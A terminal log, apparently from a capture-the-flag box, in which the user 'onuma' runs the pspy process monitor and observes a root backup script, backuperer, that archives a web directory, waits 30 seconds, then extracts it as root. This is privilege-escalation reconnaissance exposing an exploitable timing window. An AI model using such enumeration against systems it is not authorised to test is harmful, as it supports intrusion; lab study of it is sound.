onuma@TartarSauce:/dev/shm$ ./pspy32
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/03/30 12:24:20 CMD: UID=0    PID=992    | /usr/lib/policykit-1/polkitd --no-debug
2021/03/30 12:24:54 CMD: UID=0    PID=3488   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3489   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3490   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3491   |
2021/03/30 12:24:54 CMD: UID=0    PID=3492   |
2021/03/30 12:24:54 CMD: UID=0    PID=3493   |
2021/03/30 12:24:54 CMD: UID=0    PID=3495   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3496   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3497   |
2021/03/30 12:24:54 CMD: UID=0    PID=3498   |
2021/03/30 12:24:54 CMD: UID=0    PID=3499   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3500   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3501   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3502   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3504   |
2021/03/30 12:24:54 CMD: UID=0    PID=3506   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3507   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3508   |
2021/03/30 12:24:54 CMD: UID=0    PID=3510   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3511   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3512   |
2021/03/30 12:24:54 CMD: UID=0    PID=3514   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3515   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3518   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3521   |
2021/03/30 12:24:54 CMD: UID=0    PID=3523   | /bin/rm -rf /var/tmp/. /var/tmp/.. /var/tmp/check
2021/03/30 12:24:54 CMD: UID=0    PID=3527   | /bin/sleep 30
2021/03/30 12:24:54 CMD: UID=0    PID=3526   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=1000 PID=3530   | /bin/tar -zcvf /var/tmp/.291abafda3a9a189bd87fce39dc5a83112cc2438 /var/www/html
2021/03/30 12:24:54 CMD: UID=1000 PID=3531   | gzip
2021/03/30 12:25:24 CMD: UID=0    PID=3537   | /bin/tar -zxvf /var/tmp/.291abafda3a9a189bd87fce39dc5a83112cc2438 -C /var/tmp/check
2021/03/30 12:25:24 CMD: UID=0    PID=3536   | /bin/tar -zxvf /var/tmp/.291abafda3a9a189bd87fce39dc5a83112cc2438 -C /var/tmp/check
2021/03/30 12:25:25 CMD: UID=0    PID=3539   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:25:25 CMD: UID=0    PID=3538   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:25:25 CMD: UID=0    PID=3540   | /bin/mv /var/tmp/.291abafda3a9a189bd87fce39dc5a83112cc2438 /var/backups/onuma-www-dev.bak
2021/03/30 12:25:25 CMD: UID=0    PID=3541   | /bin/rm -rf /var/tmp/check . ..
2021/03/30 12:25:25 CMD: UID=0    PID=3544   |
^CExiting program... (interrupt)
